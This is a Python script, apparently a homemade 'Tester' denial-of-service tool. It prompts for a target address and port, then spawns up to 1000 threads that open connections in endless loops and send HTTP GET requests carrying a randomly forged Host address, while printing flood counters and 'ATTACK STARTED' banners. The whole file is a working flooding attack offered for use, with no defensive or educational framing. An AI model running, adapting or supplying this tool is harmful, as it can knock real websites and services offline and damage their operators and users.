import datetime
e = datetime.datetime.now()
date = (f'{e.day}/{e.month}/{e.year}')
hour = (f'{e.hour}:{e.minute}:{e.second}')
attack = (f'\033[1;96mATTACK STARTED: \033[1;91m{date} \033[1;96mAS: \033[1;91m{hour}')


logo = ('''
\033[1;96m /$$$$$$$$                    /$$                        
\033[1;96m|__  $$__/                   | $$                        
\033[1;96m   | $$  /$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$ 
\033[1;96m   | $$ /$$__  $$ /$$_____/|_  $$_/   /$$__  $$ /$$__  $$
\033[1;96m   | $$| $$$$$$$$|  $$$$$$   | $$    | $$$$$$$$| $$  \__/
\033[1;96m   | $$| $$_____/ \____  $$  | $$ /$$| $$_____/| $$      
\033[1;96m   | $$|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$      
\033[1;96m   |__/ \_______/|_______/    \___/   \_______/|__/      
''')

import socket
import threading
import random 
import os
import time
ip1 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])
ip2 = random.choice([9, 8, 7, 6, 5, 4, 3, 2, 1])
ip22 = random.choice([9, 8, 7, 6, 5, 4, 3, 2, 1])
ip11 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])

randomip = (f'182.21.{ip11}{ip22}.{ip1}{ip2}') 
print (logo)

print (f'RANDOM IP lmfao: {randomip}')
try:
	target = input("\033[1;96mTYPE TARGET ADDRESS: \033[1;91m")
	port = int(input("\033[1;96mTYPE THE TARGET PORT: \033[1;91m"))
except ValueError as error:
	print ('ERROR, INCORRECT ADDRESS OR PORT!')
	exit()
except KeyboardInterrupt as error:
	print (' ')
	print ('SCRIPT FAILED!')
	exit()
def ddos():   
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + randomip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()
time.sleep(0.5)
try:
	for i in range(1000): 
	    thread = threading.Thread(target=ddos)
	    thread.start()
	    flood = 0
	    for i in range(1000):
	                flood = flood + 1
	                print (f'FLOOD {flood}/1000')
	                time.sleep(0.1)
	                os.system('clear')
	                print (attack)
	                print (f'\033[1;96mSENDING 1000 PACKETS TO: \033[1;91m{target} !\033[1;96m')
	print (f'\033[1;96mFINISHED ATTACK AS: \033[1;91m{hour}\033[0;0m')
	exit()
except KeyboardInterrupt as error:
	print (' ')
	print ('CANCELED SCRIPT !')
	exit()